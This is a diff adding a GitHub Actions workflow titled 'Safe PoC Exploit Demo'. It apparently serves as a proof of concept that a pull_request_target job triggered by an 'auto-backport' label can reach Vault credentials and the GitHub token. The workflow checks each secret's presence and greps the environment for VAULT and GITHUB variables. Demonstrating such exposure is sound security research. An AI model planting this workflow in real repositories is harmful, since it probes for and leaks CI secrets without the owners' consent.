@@ -1,0 +1,41 @@
+name: Safe PoC Exploit Demo
+
+on:
+  pull_request_target:
+    types: ["labeled"]
+
+jobs:
+  safe-poc:
+    runs-on: ubuntu-latest
+    if: |
+      contains(github.event.pull_request.labels.*.name, 'auto-backport')
+    steps:
+      - name: Check Vault Role ID presence
+        run: |
+          if [ -z "${{ secrets.VAULT_ROLE_ID }}" ]; then
+            echo "VAULT_ROLE_ID is not set or inaccessible."
+          else
+            echo "VAULT_ROLE_ID is accessible in this workflow context."
+          fi
+
+      - name: Check Vault Secret ID presence
+        run: |
+          if [ -z "${{ secrets.VAULT_SECRET_ID }}" ]; then
+            echo "VAULT_SECRET_ID is not set or inaccessible."
+          else
+            echo "VAULT_SECRET_ID is accessible in this workflow context."
+          fi
+
+      - name: Check GitHub Token presence
+        run: |
+          if [ -z "${{ secrets.GITHUB_TOKEN }}" ]; then
+            echo "GITHUB_TOKEN is not set or inaccessible."
+          else
+            echo "GITHUB_TOKEN is accessible in this workflow context."
+          fi
+
+      - name: Print environment variables for inspection
+        run: |
+          echo "Environment Variables:"
+          env | grep VAULT || echo "No Vault related environment variables found"
+          env | grep GITHUB || echo "No GitHub related environment variables found"
